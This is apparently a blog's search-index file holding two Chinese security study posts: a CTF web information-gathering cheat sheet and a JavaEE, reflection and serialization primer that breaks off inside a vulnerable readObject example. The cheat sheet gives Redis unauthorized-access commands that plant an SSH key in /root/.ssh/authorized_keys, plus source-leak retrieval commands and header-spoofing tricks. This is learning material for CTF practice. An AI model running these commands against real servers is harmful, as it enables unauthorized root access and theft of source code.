<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web ctf之信息收集总结</title>
      <link href="/2025/10/07/web-ctf%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/"/>
      <url>/2025/10/07/web-ctf%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="F12"><a href="#F12" class="headerlink" title="F12"></a>F12</h3><p>F12看源码<br>藏flag或hint；</p><h5 id="练习题："><a href="#练习题：" class="headerlink" title="练习题："></a>练习题：</h5><p>bugku-ctf ：web2，计算器；</p><h3 id="Ctrl-u"><a href="#Ctrl-u" class="headerlink" title="Ctrl+u"></a>Ctrl+u</h3><p>F12被禁时，</p><p>或者说url前加view-source:</p><h5 id="练习题：-1"><a href="#练习题：-1" class="headerlink" title="练习题："></a>练习题：</h5><p>xctf：view-source；</p><h3 id="修改前端源码"><a href="#修改前端源码" class="headerlink" title="修改前端源码"></a>修改前端源码</h3><p>一般是小游戏，要求分数；<br>可通过控制台，源码等手段修改；</p><h5 id="练习题：-2"><a href="#练习题：-2" class="headerlink" title="练习题："></a>练习题：</h5><p>xctf：disabled_button；</p><h3 id="抓包和http请求头"><a href="#抓包和http请求头" class="headerlink" title="抓包和http请求头"></a>抓包和http请求头</h3><p>看post和response；</p><p>藏在cookie；flag or hint</p><p>藏在session；flag or hint</p><h5 id="练习题：-3"><a href="#练习题：-3" class="headerlink" title="练习题："></a>练习题：</h5><p>xctf： baby_web，cookie；</p><p>bugku-ctf ：web 基础 $_GET、bugku-ctf ：web 基础$_POST</p><p>响应：<br>bugku-ctf ：你必须让他停下、头等舱；</p><h4 id="请求头修改"><a href="#请求头修改" class="headerlink" title="请求头修改"></a>请求头修改</h4><p>伪造本地 ip 地 址 ，  X-FORWARDED-FOR:127.0.0.1；</p><p>修改cookie值： Cookie   http&#x3D;ad；（键值）</p><p>修改浏览器(User-Agent)   ctfbrowser  (直接放值)</p><p>修改Referer （告诉服务器：「当前这个请求是从哪个页面跳转&#x2F;点击过来的」）     告诉服务器「我从哪来」**——防盗链、CSRF、日志注入、请求头绕过都靠它，CTF 里常用来 <strong>伪造来源 or 塞 Payload</strong>。</p><p><strong><code>Host</code> 告诉服务器「我要访问你哪个虚拟站点」</strong>——虚拟主机路由、SSRF 绕过、缓存污染、头注入；</p><p><strong><code>Via</code> 记录「请求&#x2F;响应经过的代理链」</strong>——追踪路由、缓存绕过、头注入、信息泄露      即代理服务器信息；</p><h5 id="练习题：-4"><a href="#练习题：-4" class="headerlink" title="练习题："></a>练习题：</h5><p>bugku-ctf ：域名解析、管理员系统；</p><h3 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h3><p>常⻅信息泄露：robots.txt(机器⼈)，即访问url&#x2F;robots.txt</p><p>Robots协议：它通常告诉⽹络搜索引擎的漫游器（⼜称⽹络蜘蛛），此⽹站中的哪些内容是不应<br>被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。</p><h5 id="练习题"><a href="#练习题" class="headerlink" title="练习题:"></a>练习题:</h5><p>xctf： Training-WWW-Robots；robots；</p><p>bugku-ctf ：细心、phpcmsV9；</p><h3 id="phps泄露"><a href="#phps泄露" class="headerlink" title="phps泄露"></a>phps泄露</h3><p>phps泄露，访问url&#x2F;index.phps</p><h5 id="练习题：-5"><a href="#练习题：-5" class="headerlink" title="练习题："></a>练习题：</h5><p>xctf： PHP2；</p><h3 id="web源代码泄露"><a href="#web源代码泄露" class="headerlink" title="web源代码泄露"></a>web源代码泄露</h3><h4 id="hg-源码泄漏："><a href="#hg-源码泄漏：" class="headerlink" title=".hg 源码泄漏："></a>.hg 源码泄漏：</h4><p>漏洞成因：hg init 的时候会生成.hg，<a href="http://www.xx.com/.hg/%EF%BC%8C">http://www.xx.com/.hg/，</a></p><p>工具：dvcs-ripper，（rip-hg.pl -v -u <a href="http://www.xx.com/.hg/%EF%BC%89">http://www.xx.com/.hg/）</a></p><h4 id="git-源码泄漏："><a href="#git-源码泄漏：" class="headerlink" title=".git 源码泄漏："></a>.git 源码泄漏：</h4><p>漏洞成因：在运行 git init 初始化代码库的时候，会在当前目录下产生一个.git 的隐藏文件，用来记录代码的变更记录等，没有删除这个文件，导致泄漏，<a href="http://www.xxx.com/.git/config">http://www.xxx.com/.git/config</a></p><p>工具：GitHack，dvcs-ripper，（GitHack.py <a href="http://www.xxx.com/.git%EF%BC%8Crip-hg.pl">http://www.xxx.com/.git，rip-hg.pl</a> -v -u <a href="http://www.xx.com/.git/%EF%BC%89">http://www.xx.com/.git/）</a></p><h4 id="DS-Store-源码泄漏："><a href="#DS-Store-源码泄漏：" class="headerlink" title=".DS_Store 源码泄漏："></a>.DS_Store 源码泄漏：</h4><p>漏洞成因：在发布代码时，没有删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息，<a href="http://www.xxx.com/.ds_store">http://www.xxx.com/.ds_store</a></p><p>工具：dsstoreexp，（python ds_store_exp.py</p><p><a href="http://www.xxx.com/.DS_Store%EF%BC%89">http://www.xxx.com/.DS_Store）</a></p><h4 id="网站备份压缩文件："><a href="#网站备份压缩文件：" class="headerlink" title="网站备份压缩文件："></a>网站备份压缩文件：</h4><p>在网站的使用过程中，往往需要对网站中的文件进行修改，升级，此时就需要对网站整或其中某一页面进行备份，当备份文件或修改过程中的缓存文件因为各种原因被留在网站 web 目录下，而该目录又没有设置访问权限，就有可能导致备份文件被下载，导致信息泄漏，给服务器安全埋下隐患。.rar， .zip， .7z， .tar.gz， .bak， .swp， .txt， .html，工具：可以使用一些扫描软件，进行扫描，如 awvs 之类的</p><h5 id="练习题：-6"><a href="#练习题：-6" class="headerlink" title="练习题："></a>练习题：</h5><p>xctf：backup；</p><h5 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h5><p>swp是vim编辑器的临时交换⽂件，即swap（交换分区）的简写。是⼀个隐藏⽂件。⽤来备份缓冲区的内容，如果未对⽂件进⾏修改，是不会产⽣swp⽂件的。<br>如果不想产⽣交换⽂件，所以在vim配置中添加set noswapfile所以当异常退出的时候，swp⽂件就会留下了，此时就可以通过缓存⽂件来恢复原始⽂件内容<br>以index.php为例，第⼀次产⽣的为.index.php.swp<br>第⼆次意外退出后产⽣的为 .index.php.swoo<br>第三次为 .index.php.swn<br>注意后.在开头，因为是隐藏⽂件<br>接用 vim -r inde.php 来读取文件</p><h5 id="练习题：-7"><a href="#练习题：-7" class="headerlink" title="练习题："></a>练习题：</h5><p>bugku-ctf ：备份是个好习惯， 导航；</p><h4 id="SVN-导致文件泄漏："><a href="#SVN-导致文件泄漏：" class="headerlink" title=".SVN 导致文件泄漏："></a>.SVN 导致文件泄漏：</h4><p>版本控制系统</p><p>工具：dvcs-ripper，Seay-Svn，（rip-svn.pl -v -u</p><p><a href="http://www.xxx.com/.svn/%EF%BC%89">http://www.xxx.com/.svn/）</a></p><h4 id="未授权访问漏洞："><a href="#未授权访问漏洞：" class="headerlink" title="未授权访问漏洞："></a>未授权访问漏洞：</h4><p>未授权访问—-应用层服务的问题，服务启动后，没配置任何凭证，导致可以直接进入</p><p>弱口令—配置的密码过于简单常见</p><p>空口令—没配置密码</p><p>目前主要存在未授权访问漏洞的如下：<br>NFS，Samba，LDAP，Rsync，FTP，Gitlab，Jenkins，MongoDB，Redis，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo 等，这些都是挖矿勒索的高发地带<br>如：<br>redis 为授权访问漏洞，默认情况下会绑定在 0.0.0.0:6379，这样会将 redis服务暴露到公网上，如果没有开启认证的情况下，可以导致任意用户可以访问目标服务器，可以利用相关方法，在 redis 服务器上写入公钥，进而可以使用对应私钥直接登陆目标服务器。</p><p>1.本地生成公钥私钥ssh-keygen -t rsa</p><p>2.把公钥写入 xx.txt 文件</p><p>(echo -e “\n\n”;cat id_rsa.pub;echo -e “\n\n”) &gt; xx.txt</p><p>3.连接 redis 写入文件</p><p>cat xx.txt | redis-cli -h 192.168.1.2 -x set crackit</p><p>redis-cli -h 192.168.1.2</p><p>192.168.1.2:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;</p><p>192.168.1.2:6379&gt; config get dir</p><p>1)”dir”</p><p>2)”&#x2F;root&#x2F;.ssh”192.168.1.2:6379&gt; config set dbfilename “authorized_keys”192.168.1.2”6379&gt; save</p><p>也可以使用 msf 里面成熟的 exp 来利用</p><h4 id="sql备份⽂件泄漏"><a href="#sql备份⽂件泄漏" class="headerlink" title="sql备份⽂件泄漏"></a>sql备份⽂件泄漏</h4><h3 id="域名txt记录"><a href="#域名txt记录" class="headerlink" title="域名txt记录"></a>域名txt记录</h3><p>藏在域名的txt记录中，可以使⽤nslookup，也可以使⽤阿⾥云的解析。</p><h3 id="php探针"><a href="#php探针" class="headerlink" title="php探针"></a>php探针</h3><p>探针，考察PHP探针php探针是⽤来探测空间、服务器运⾏状况和PHP信息⽤的，探针可以实时查看服务器硬盘资源、内存占⽤、⽹卡 流量、系统负载、服务器时间等信息。</p><p>访问url&#x2F;tz.php</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>javasec</title>
      <link href="/2025/07/21/javasec/"/>
      <url>/2025/07/21/javasec/</url>
      
        <content type="html"><![CDATA[<h2 id="javaee"><a href="#javaee" class="headerlink" title="javaee"></a>javaee</h2><h2 id="什么是-JavaEE"><a href="#什么是-JavaEE" class="headerlink" title="什么是 JavaEE"></a>什么是 JavaEE</h2><h3 id="JavaEE-概念"><a href="#JavaEE-概念" class="headerlink" title="JavaEE 概念"></a>JavaEE 概念</h3><p>Java EE，Java 平台企业版（Java Platform Enterprise Edition），之前称为Java 2 Platform, Enterprise Edition (J2EE)，2018年3月更名为 Jakarta EE(这个名称应该还没有得到群众认可)。狭义的 Java EE 是 Sun 公司为企业级应用推出的标准平台，用来开发B&#x2F;S架构软件，可以说是一个框架，也可以说是一种规范。</p><p>广义的 Java EE 包含各种框架，其中最重要的就是 Spring 全家桶。Spring 诞生之初是为了改进 Java EE 开发的体验，后来逐渐成为了 Java Web 开发的实际标准。后面的文章里，会对 Spring 进行进一步的说明。</p><h3 id="JavaEE-与-JavaSE-的区别与联系"><a href="#JavaEE-与-JavaSE-的区别与联系" class="headerlink" title="JavaEE 与 JavaSE 的区别与联系"></a>JavaEE 与 <a href="https://so.csdn.net/so/search?q=JavaSE&spm=1001.2101.3001.7020">JavaSE</a> 的区别与联系</h3><p>JavaEE 是在 JavaSE 的基础上构建的，是对 JavaSE 的扩展，增加了一些更加便捷的应用框架。</p><p>除了 EE 和 SE，还有为移动端而生的 JavaME，但目前应用不算广泛。三者的关系可以用下图概括：</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/1218fe4d5ca24abd52d860eebf8b15c6.png" alt="JavaSE\EE\ME关系"></p><h3 id="JavaEE主要技术"><a href="#JavaEE主要技术" class="headerlink" title="JavaEE主要技术"></a>JavaEE主要技术</h3><p>JavaEE 号称有十三种核心技术。它们分别是：<strong>JDBC</strong>、<strong>JNDI</strong>、<strong>EJB</strong>、RMI、<strong>Servlet</strong>、<strong>JSP</strong>、XML、JMS、Java IDL、JTS、JTA、JavaMail和JAF。</p><p>简单介绍下需要重点关注的技术。</p><h4 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h4><p>Java 数据库连接，（Java Database Connectivity，JDBC）是 Java 语言中用来<strong>规范客户端程序如何来访问数据库的应用程序接口</strong>，提供了诸如查询和更新数据库中数据的方法。</p><h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><p>Java 命名和目录接口（Java Naming and Directory Interface，JNDI），是 Java 的一个<strong>目录服务应用程序界面</strong>（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p><h4 id="EJB"><a href="#EJB" class="headerlink" title="EJB"></a>EJB</h4><p>企业级 JavaBean（Enterprise JavaBean, EJB）是一个用来构筑企业级应用的服务器端可被管理<strong>组件</strong>。不过这个东西在 Spring 问世后基本凉凉了，知道是什么就行。</p><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><p>Servlet（Server Applet），是用 Java 编写的<strong>服务器端程序</strong>。其主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。</p><p><strong>狭义的 Servlet 是指 Java 语言实现的一个接口，广义的 Servlet 是指任何实现了这个 Servlet 接口的类，一般情况下，人们将 Servlet 理解为后者。</strong></p><h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><p>JSP（全称JavaServer Pages）是由 Sun 公司主导创建的一种<strong>动态网页技术标准</strong>。JSP 部署于网络服务器上，可以响应客户端发送的请求，并根据请求内容动态地生成 HTML、XML 或其他格式文档的 Web 网页，然后返回给请求者。</p><h3 id="JavaEE框架"><a href="#JavaEE框架" class="headerlink" title="JavaEE框架"></a>JavaEE框架</h3><p>JavaEE 拥有广泛市场的原因之一就是可以使用多种框架来使开发变得简单。对于框架的选择多种多样，目前比较常见的<strong>框架组合</strong>有 <strong>SSH</strong>和<strong>SSM</strong>。在后面的章节中会作详细介绍。另外Spring本身也提供了多种层次的框架供选择，可以到Spring官网了解详情。</p><p>Spring： <a href="https://spring.io/">https://spring.io/</a></p><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p>Structs + Spring + Hibernate</p><h4 id="SSM"><a href="#SSM" class="headerlink" title="SSM"></a>SSM</h4><p>Spring +SpringMVC + MyBatis</p><h3 id="JavaEE-学习路径"><a href="#JavaEE-学习路径" class="headerlink" title="JavaEE 学习路径"></a>JavaEE 学习路径</h3><p>一般来讲，初学者应该遵循以下路径</p><p><strong>Servlet -&gt; JSP -&gt; Spring -&gt; 组合框架</strong></p><p>Servlet 和 JSP 在日后的开发中虽然很少直接应用，但却是各种框架的基础，应该放在开始去了解。</p><p>推荐一个学习 Java 的良心网站，里面有 Java 全栈知识，在每个阶段都设置了练习内容，——</p><p><a href="http://how2j.cn/?p=50613">「How2J 的 Java 教程」</a></p><h2 id="java反射基础"><a href="#java反射基础" class="headerlink" title="java反射基础"></a>java反射基础</h2><h3 id="一、反射基础代码感知"><a href="#一、反射基础代码感知" class="headerlink" title="一、反射基础代码感知"></a>一、反射基础代码感知</h3><h4 id="1-反射是什么？"><a href="#1-反射是什么？" class="headerlink" title="1.反射是什么？"></a><strong>1.反射是什么？</strong></h4><p>反射就像是Java给你的“后悔药”——允许你在代码跑起来之后，再动态地去：</p><ol><li><strong>看</strong>一个类的内部结构（有啥方法、字段、注解）</li><li><strong>凭空造新的obj</strong>（new对象）</li><li><strong>远程操控</strong>（调方法、改字段值）</li><li><strong>无视隐私</strong>（访问<code>private</code>成员！）</li></ol><blockquote><p><strong>为啥叫“反射”？</strong><br>可以把一个类当成镜子，反射就是让你在运行时“照镜子”——看清自己（类）长啥样，还能动手动脚（改它）。</p></blockquote><h4 id="2-反射能做什么？"><a href="#2-反射能做什么？" class="headerlink" title="2. 反射能做什么？"></a>2. <strong>反射能做什么？</strong></h4><p>通过反射，<strong>运行时</strong>动态操作类信息，无需在编译时确定具体类。以下代码演示核心功能：</p><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 动态加载类（类名可来自配置文件/网络）</span></span><br><span class="line">Class&lt;?&gt; clazz = Class.<span class="property">forName</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建对象（无需new关键字）</span></span><br><span class="line"><span class="built_in">Object</span> <span class="built_in">str</span> = clazz.<span class="property">getDeclaredConstructor</span>().<span class="property">newInstance</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 调用方法（方法名可动态传入）</span></span><br><span class="line">Method method = clazz.<span class="property">getMethod</span>(<span class="string">&quot;substring&quot;</span>, <span class="type">int</span>.<span class="property">class</span>);</span><br><span class="line"><span class="built_in">String</span> result = (<span class="built_in">String</span>) method.<span class="property">invoke</span>(<span class="built_in">str</span>, <span class="number">2</span>); <span class="comment">// 调用str.substring(2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 访问私有字段（突破封装性）</span></span><br><span class="line">Field field = clazz.<span class="property">getDeclaredField</span>(<span class="string">&quot;value&quot;</span>); <span class="comment">// String内部存储字符的数组</span></span><br><span class="line">field.<span class="property">setAccessible</span>(<span class="literal">true</span>); <span class="comment">// 暴力反射！</span></span><br><span class="line"><span class="type">byte</span>[] value = (<span class="type">byte</span>[]) field.<span class="property">get</span>(<span class="built_in">str</span>);</span><br><span class="line">System.<span class="property">out</span>.<span class="property">println</span>(Arrays.<span class="property">toString</span>(value)); <span class="comment">// 输出字符数组</span></span><br></pre></td></tr></table></figure><p>以<strong>Spring IOC</strong>为例，它大概这么玩反射：</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanFactory</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">Map</span>&lt;<span class="title class_">String</span>, <span class="title class_">Object</span>&gt; beanMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">registerBean</span>(<span class="params"><span class="title class_">String</span> beanName, <span class="title class_">String</span> className</span>) &#123;</span><br><span class="line">        <span class="comment">// 1. 反射加载类</span></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; clazz = <span class="title class_">Class</span>.<span class="title function_">forName</span>(className);</span><br><span class="line">        <span class="comment">// 2. 反射创建对象（通常调无参构造）</span></span><br><span class="line">        <span class="title class_">Object</span> bean = clazz.<span class="title function_">getDeclaredConstructor</span>().<span class="title function_">newInstance</span>();</span><br><span class="line">        <span class="comment">// 3. 塞进容器（下次getBean直接拿）</span></span><br><span class="line">        beanMap.<span class="title function_">put</span>(beanName, bean);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">Object</span> <span class="title function_">getBean</span>(<span class="params"><span class="title class_">String</span> beanName</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> beanMap.<span class="title function_">get</span>(beanName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>实际Spring还做了<strong>依赖注入</strong>（用反射<code>set</code>字段）、<strong>AOP代理</strong>（反射调方法）—— 所以说没反射就没Spring！</p></blockquote><blockquote><p>另外进阶的（待）：</p><ul><li><strong>动态代理</strong>：JDK的<code>Proxy.newProxyInstance()</code>靠反射生成代理类，实现AOP切面。</li></ul></blockquote><ul><li><strong>注解扫描</strong>：JUnit用反射找<code>@Test</code>方法；Spring扫描<code>@Component</code>。</li><li><strong>越过泛型擦除</strong>：反射能拿到<code>List&lt;String&gt;</code>的实际泛型类型（虽然99%场景用不到）。</li></ul><p><strong>关键点</strong>：</p><ul><li><code>Class.forName()</code>：通过字符串加载类（<strong>解耦</strong>的关键）</li><li><code>getMethod()</code> + <code>invoke()</code>：动态调用方法（框架核心原理）</li><li><code>setAccessible(true)</code>：访问私有成员（<strong>慎用</strong>，破坏封装性）</li></ul><hr><h3 id="二、反射的核心原理与类库"><a href="#二、反射的核心原理与类库" class="headerlink" title="二、反射的核心原理与类库"></a>二、反射的核心原理与类库</h3><h4 id="1-反射的基石：Class对象—–-反射的钥匙"><a href="#1-反射的基石：Class对象—–-反射的钥匙" class="headerlink" title="1. 反射的基石：Class对象—– 反射的钥匙"></a>1. <strong>反射的基石：<code>Class</code>对象</strong>—– <strong>反射的钥匙</strong></h4><ul><li><p><strong>每个类在JVM中只有一个<code>Class</code>对象</strong>，存储类元信息（方法、字段等）。</p></li><li><p>获取<code>Class</code>对象的三种方式：</p>  <figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; c1 = String.<span class="keyword">class</span>;          <span class="comment">// 类字面量</span></span><br><span class="line"><span class="keyword">Class</span>&lt;?&gt; c2 = <span class="string">&quot;abc&quot;</span>.getClass();      <span class="comment">// 对象实例</span></span><br><span class="line"><span class="keyword">Class</span>&lt;?&gt; c3 = <span class="keyword">Class</span>.forName(<span class="string">&quot;java.lang.String&quot;</span>); <span class="comment">// 最常用（动态加载）</span></span><br></pre></td></tr></table></figure><p>  <strong>为什么用<code>Class.forName</code>？</strong><br>  支持从配置文件&#x2F;数据库读取类名，实现<strong>动态扩展</strong>（如Spring的Bean加载）。</p></li></ul><h4 id="2-反射操作的三类API"><a href="#2-反射操作的三类API" class="headerlink" title="2. 反射操作的三类API"></a>2. <strong>反射操作的三类API</strong></h4><table><thead><tr><th><strong>操作类型</strong></th><th><strong>核心类</strong></th><th><strong>常用方法</strong></th><th><strong>用途</strong></th></tr></thead><tbody><tr><td><strong>创建对象</strong></td><td><code>Constructor</code></td><td><code>getDeclaredConstructor()</code> + <code>newInstance()</code></td><td>替代<code>new</code>关键字</td></tr><tr><td><strong>调用方法</strong></td><td><code>Method</code></td><td><code>getMethod()</code> + <code>invoke()</code></td><td>动态执行方法（如Spring MVC控制器）</td></tr><tr><td><strong>访问字段</strong></td><td><code>Field</code></td><td><code>getDeclaredField()</code> + <code>get()/set()</code></td><td>读写字段值（包括私有字段）</td></tr></tbody></table><h4 id="不用new也能创建对象"><a href="#不用new也能创建对象" class="headerlink" title="** 不用new也能创建对象**"></a>** 不用new也能创建对象**</h4><p>拿到<code>Class</code>后，就能创建对象了！尤其适合<strong>不知道具体类</strong>的场景（比如Spring创建Bean）：</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1：调无参构造（最常用）</span></span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.User&quot;</span>);</span><br><span class="line"><span class="built_in">Object</span> user = clazz.getDeclaredConstructor().newInstance(); <span class="comment">// 相当于 new User()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2：调有参构造（带参数的那种）</span></span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getConstructor(<span class="built_in">String</span>.<span class="keyword">class</span>, <span class="built_in">int</span>.<span class="keyword">class</span>); <span class="comment">// 参数类型列表</span></span><br><span class="line"><span class="built_in">Object</span> user2 = constructor.newInstance(<span class="string">&quot;张三&quot;</span>, <span class="number">25</span>); <span class="comment">// 传入实参</span></span><br></pre></td></tr></table></figure><blockquote><p> <strong>坑</strong>：<code>clazz.newInstance()</code>已过时！用<code>getDeclaredConstructor().newInstance()</code>代替。</p></blockquote><hr><h4 id="方法"><a href="#方法" class="headerlink" title="** 方法**"></a>** 方法**</h4><p>动态调方法才是反射的好玩操作！比如根据用户输入调用不同API：</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 步骤1：拿到Method对象（方法名+参数类型）</span></span><br><span class="line">Method method = clazz.<span class="built_in">getMethod</span>(<span class="string">&quot;setName&quot;</span>, <span class="type">String</span>.<span class="keyword">class</span>); <span class="comment">// 方法名&quot;setName&quot;，参数String</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 步骤2：对着对象“按按钮”（invoke）</span></span><br><span class="line">method.<span class="built_in">invoke</span>(user, <span class="string">&quot;张三&quot;</span>); <span class="comment">// 相当于 user.setName(&quot;张三&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 甚至...调用私有方法！（危险动作）</span></span><br><span class="line">Method secretMethod = clazz.<span class="built_in">getDeclaredMethod</span>(<span class="string">&quot;privateMethod&quot;</span>);</span><br><span class="line">secretMethod.<span class="built_in">setAccessible</span>(<span class="literal">true</span>); <span class="comment">// 暴力突破private限制！</span></span><br><span class="line">secretMethod.<span class="built_in">invoke</span>(user);</span><br></pre></td></tr></table></figure><blockquote><p> <strong>黑科技</strong>：<code>setAccessible(true)</code>是反射的“破墙锤”——能访问<code>private</code>&#x2F;<code>protected</code>成员（框架里常用，自己代码慎用！）。</p></blockquote><hr><h4 id="改字段——改对象内存"><a href="#改字段——改对象内存" class="headerlink" title="** 改字段——改对象内存**"></a>** 改字段——改对象内存**</h4><p>直接修改对象属性，连setter都不用</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 偷看字段值</span></span><br><span class="line">Field field = clazz.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>); <span class="comment">// 无视private</span></span><br><span class="line"><span class="built_in">int</span> age = (<span class="built_in">int</span>) field.<span class="keyword">get</span>(user); <span class="comment">// 拿到user.age的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 偷偷改掉！</span></span><br><span class="line">field.<span class="keyword">set</span>(user, <span class="number">30</span>); <span class="comment">// 神不知鬼不觉把age改成30</span></span><br></pre></td></tr></table></figure><blockquote><p> <strong>实验</strong>：试试用反射改<code>String</code>的内容？—— JVM对<code>String</code>做了优化，别白费劲啦。</p></blockquote><blockquote><p> <strong>对比：</strong></p><ul><li><code>getDeclaredXxx()</code>：获取<strong>所有</strong>成员（包括私有）</li><li><code>getXxx()</code>：仅获取<strong>public</strong>成员</li></ul></blockquote><h4 id="3-反射的底层实现"><a href="#3-反射的底层实现" class="headerlink" title="3. 反射的底层实现"></a>3. <strong>反射的底层实现</strong></h4><ul><li><strong>类加载机制</strong>：<br>  JVM加载<code>.class</code>文件 → 生成<code>Class</code>对象 → 解析类结构（方法表、字段表等）。</li><li><strong>反射调用性能较低</strong>：<br>  因需<strong>动态解析类型</strong> + <strong>安全检查</strong>（如<code>setAccessible</code>跳过检查可提升性能）。</li></ul><hr><h3 id="三、反射的应用场景与注意事项"><a href="#三、反射的应用场景与注意事项" class="headerlink" title="三、反射的应用场景与注意事项"></a>三、反射的应用场景与注意事项</h3><h4 id="1-典型应用场景"><a href="#1-典型应用场景" class="headerlink" title="1. 典型应用场景"></a>1. <strong>典型应用场景</strong></h4><table><thead><tr><th><strong>场景</strong></th><th><strong>代表框架</strong></th><th><strong>反射的作用</strong></th></tr></thead><tbody><tr><td><strong>动态代理</strong></td><td>Spring AOP</td><td>生成代理类，拦截方法调用</td></tr><tr><td><strong>依赖注入</strong></td><td>Spring IOC</td><td>根据配置创建并注入Bean对象</td></tr><tr><td><strong>注解解析</strong></td><td>JUnit</td><td>扫描<code>@Test</code>注解的方法并执行测试</td></tr><tr><td><strong>序列化&#x2F;反序列化</strong></td><td>Jackson&#x2F;Gson</td><td>将JSON字段映射到对象的私有属性</td></tr></tbody></table><h4 id="2-反射的“安全墙”"><a href="#2-反射的“安全墙”" class="headerlink" title="2. 反射的“安全墙”"></a>2. <strong>反射的“安全墙”</strong></h4><ul><li><strong>权限控制</strong>：<br>  默认无法访问私有成员，需显式调用<code>setAccessible(true)</code>（可能触发安全管理器拦截）。</li><li><strong>替代方案</strong>：<br>  优先使用接口、设计模式（如工厂模式），避免过度依赖反射。</li></ul><h4 id="3-性能优化建议"><a href="#3-性能优化建议" class="headerlink" title="3. 性能优化建议"></a>3. <strong>性能优化建议</strong></h4><ul><li><strong>缓存<code>Class</code>对象</strong>：避免重复调用<code>Class.forName()</code>。</li><li><strong>减少<code>setAccessible(true)</code>调用</strong>：每次调用都有安全检查开销。</li><li><strong>优先用接口调用</strong>：如<code>obj.method()</code>比<code>method.invoke(obj)</code>快10倍以上。</li></ul><hr><h3 id="四、总结："><a href="#四、总结：" class="headerlink" title="四、总结："></a>四、总结：</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">graph <span class="selector-tag">TD</span></span><br><span class="line">    <span class="selector-tag">A</span><span class="selector-attr">[反射核心：Class对象]</span> --&gt; <span class="selector-tag">B</span><span class="selector-attr">[创建对象]</span></span><br><span class="line">    <span class="selector-tag">A</span> --&gt; C<span class="selector-attr">[调用方法]</span></span><br><span class="line">    <span class="selector-tag">A</span> --&gt; D<span class="selector-attr">[访问字段]</span></span><br><span class="line">    <span class="selector-tag">B</span> --&gt; E<span class="selector-attr">[Constructor.newInstance()]</span></span><br><span class="line">    C --&gt; F<span class="selector-attr">[Method.invoke()]</span></span><br><span class="line">    D --&gt; <span class="selector-tag">G</span><span class="selector-attr">[Field.get()/set()]</span></span><br><span class="line">    E --&gt; H<span class="selector-attr">[动态代理/IOC]</span></span><br><span class="line">    F --&gt; <span class="selector-tag">I</span><span class="selector-attr">[框架方法拦截]</span></span><br><span class="line">    <span class="selector-tag">G</span> --&gt; J<span class="selector-attr">[序列化/配置注入]</span></span><br><span class="line">    H --&gt; K<span class="selector-attr">[Spring]</span></span><br><span class="line">    <span class="selector-tag">I</span> --&gt; K</span><br><span class="line">    J --&gt; K</span><br></pre></td></tr></table></figure><p><strong>反射的本质</strong>：<strong>运行时操作类元信息的能力</strong>，是框架灵活性的根基，但需权衡<strong>灵活性</strong>、<strong>安全性</strong>与<strong>性能</strong>。</p><h2 id="java序列化基础"><a href="#java序列化基础" class="headerlink" title="java序列化基础"></a>java序列化基础</h2><h3 id="一、先看一个漏洞触发案例"><a href="#一、先看一个漏洞触发案例" class="headerlink" title="一、先看一个漏洞触发案例"></a><strong>一、先看一个漏洞触发案例</strong></h3><p>完整：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 漏洞类：重写了readObject()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String command;</span><br><span class="line">    <span class="comment">// 